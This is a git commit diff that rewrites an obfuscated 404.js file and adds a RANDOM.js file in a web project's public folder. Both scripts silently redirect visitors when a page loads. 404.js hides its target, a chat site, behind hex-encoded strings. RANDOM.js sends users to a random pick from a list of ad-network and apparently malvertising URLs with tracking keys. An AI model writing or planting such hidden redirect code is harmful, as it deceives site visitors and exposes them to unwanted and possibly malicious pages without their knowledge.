dc18a95401daed44f15192ba7c225924042d37b8
irawanria85 <102246214+infojandamuda@users.noreply.github.com>
2022-05-18 15:54:35 +0700

    wa

--- public/DuZJRauGznRIQGNPjxOyGH/js/404.js
+++ public/DuZJRauGznRIQGNPjxOyGH/js/404.js
@@ -1,9 +1,9 @@
-/* goto https://chat.indonesiya.com/DuZJRauGznRIQGNPjxOyGH */
-var _0xfd6e = ["\x68\x72\x65\x66", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x68\x61\x74\x2E\x69\x6E\x64\x6F\x6E\x65\x73\x69\x79\x61\x2E\x63\x6F\x6D\x2F\x44\x75\x5A\x4A\x52\x61\x75\x47\x7A\x6E\x52\x49\x51\x47\x4E\x50\x6A\x78\x4F\x79\x47\x48"];
-var _0x4093 = [_0xfd6e[0], _0xfd6e[1]];
-var _0x2368 = [_0x4093[0], _0x4093[1]];
-var _0xf487 = [_0x2368[0], _0x2368[1]];
-var _0x379a = [_0xf487[0], _0xf487[1]];
-var _0x8ec4 = [_0x379a[0], _0x379a[1]];
-var _0xed20 = [_0x8ec4[0], _0x8ec4[1]];
-location[_0xed20[0]] = _0xed20[1]
+// https://chat.indonesiya.com/DuZJRauGznRIQGNPjxOyGH
+var _0x82ef = ["\x68\x72\x65\x66", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x68\x61\x74\x2E\x69\x6E\x64\x6F\x6E\x65\x73\x69\x79\x61\x2E\x63\x6F\x6D\x2F\x44\x75\x5A\x4A\x52\x61\x75\x47\x7A\x6E\x52\x49\x51\x47\x4E\x50\x6A\x78\x4F\x79\x47\x48"];
+var _0xbad2 = [_0x82ef[0], _0x82ef[1]];
+var _0x8245 = [_0xbad2[0], _0xbad2[1]];
+var _0x2070 = [_0x8245[0], _0x8245[1]];
+var _0xf72b = [_0x2070[0], _0x2070[1]];
+var _0x2838 = [_0xf72b[0], _0xf72b[1]];
+var _0x9a83 = [_0x2838[0], _0x2838[1]];
+location[_0x9a83[0]] = _0x9a83[1]
---
+++ public/js/RANDOM.js
@@ -0,0 +1,20 @@
+var pages = [
+
+    "https://euizhltcd6ih.com/a1cxr71k2p?key=fb4650db89e13e5f6259102256e2dd28",
+    "https://jc32arlvqpv8.com/febkqdwq69?key=85936785030b9494c1edaf06c2488cc3",
+    "https://slahpxqb6wto.com/y2zywvx6?key=1913df17f2e84ef9fe8bdcd130e989e7",
+    "https://www.effectivecpmcontent.com/ian5sddbhn?key=cab0e894642dc56f27b8ada7e2ed25ff",
+    "https://www.effectivecpmcontent.com/eawyaazrt4?key=78778840d1d33d8d36ec5f44c894e44b",
+    "https://practicallysacrificestock.com/b2ughqsc?key=e4d471abe0b82cfdf0e8a0ea8b121e2d",
+    "https://www.safestgatetocontent.com/u3fyz7ax?key=d2a2e52da1a3d7dfe97062207314bc65",
+    "https://www.safestgatetocontent.com/zt86y8vudf?key=aa7208b0d41c522aff283732b16f67f5",
+    "https://chokupsupto.com/be3UV_0.P/3YpXvRb/mmV/JmZhDR0w0/NUD/U/x-NTDRQ/4PLoTIQX0mNKTiEQ0iNrD-kj",
+    "https://chokupsupto.com/be3JV/0.PW3Up/vabLmlVTJ/ZbDy0/0uNDDAU/xKNYDsQmw/LQT_QI0gNWT/E/0pNSDsEo",
+
+
+];
+
+function randomPage() {
+    return pages[Math.round(Math.random() * (pages.length - 1))];
+}
+location.href = randomPage();
